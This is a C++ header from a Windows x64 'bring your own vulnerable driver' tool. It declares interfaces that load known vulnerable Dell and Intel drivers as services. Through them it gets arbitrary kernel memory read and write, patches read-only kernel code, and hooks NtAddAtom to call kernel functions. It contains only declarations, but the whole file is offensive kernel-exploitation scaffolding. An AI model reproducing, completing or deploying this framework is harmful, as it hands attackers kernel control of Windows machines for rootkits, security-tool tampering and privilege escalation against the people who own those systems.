#pragma once
#include <windows.h>
#include <string>
#include <cstdint>
#include <vector>
#include <memory>

namespace hinv {
namespace byovd {

static_assert(sizeof(void*) == 8, "hinv supports x64 Windows only");

// Supported vulnerable-driver backends. Add more here as you integrate them.
enum class BackendType {
    Unknown = 0,
    DbUtil,     // Dell dbutil_2_3.sys       - arbitrary kernel virt read/write
    Intel,      // Intel iqvw64e.sys         - CopyMemory + physical map (kdmapper-style)
};

struct DriverProfile {
    BackendType type;
    std::wstring serviceName;
    std::wstring devicePath;          // e.g. L"\\\\.\\Nal"
    std::wstring driverFileName;      // e.g. L"iqvw64e.sys"
    DWORD        readIoc;
    DWORD        writeIoc;
    std::wstring expectedSha256;      // empty when no reference hash is available
};

// Generic kernel read/write primitive. Implemented per backend.
class IByovdBackend {
public:
    virtual ~IByovdBackend() = default;

    virtual bool Initialize(const std::wstring& driverPath) = 0;
    // False means the backend deliberately remains live because prevention,
    // stop, or removal could not be confirmed.
    virtual bool Shutdown() = 0;
    virtual bool IsReady() const = 0;

    virtual bool ReadKernelMemory(uint64_t kernelVa, void* out, size_t size) = 0;
    virtual bool WriteKernelMemory(uint64_t kernelVa, const void* in, size_t size) = 0;

    // Allocate contiguous physical memory visible from kernel. Optional.
    virtual bool AllocateKernelMemory(size_t size, uint64_t& outKernelVa) {
        (void)size; (void)outKernelVa;
        return false;
    }

    // Write to read-only kernel memory (e.g. via VA->PA + physical mapping).
    // Optional; backends without physical access return false. Required by
    // kmem::CallKernelFunction (NtAddAtom hook).
    virtual bool WriteReadOnlyMemory(uint64_t kernelVa, const void* buf, size_t size) {
        (void)kernelVa; (void)buf; (void)size;
        return false;
    }

    // Publish one aligned 64-bit instruction bundle in read-only kernel text.
    // Implementations must issue one naturally aligned 8-byte store.
    virtual bool WriteReadOnlyMemoryAtomic8(uint64_t kernelVa, uint64_t value) {
        (void)kernelVa; (void)value;
        return false;
    }
};

// Returns a profile for known driver names.
DriverProfile DetectProfile(const std::wstring& driverFileName);

// Create a backend instance for the given profile. Caller owns the pointer.
std::unique_ptr<IByovdBackend> CreateBackend(const DriverProfile& profile);

// Convenience: load a vulnerable driver and create the appropriate backend.
std::unique_ptr<IByovdBackend> LoadVulnerableDriver(const std::wstring& driverPath);

// Service helpers.
// Installs a new service only. Existing services are never adopted or
// reconfigured. outCreated is true only when this call created the service.
bool InstallDriverService(const std::wstring& serviceName, const std::wstring& driverPath,
                          bool* outCreated = nullptr);
bool StartDriverService(const std::wstring& serviceName);
bool StopDriverService(const std::wstring& serviceName);
bool RemoveDriverService(const std::wstring& serviceName);

} // namespace byovd
} // namespace hinv
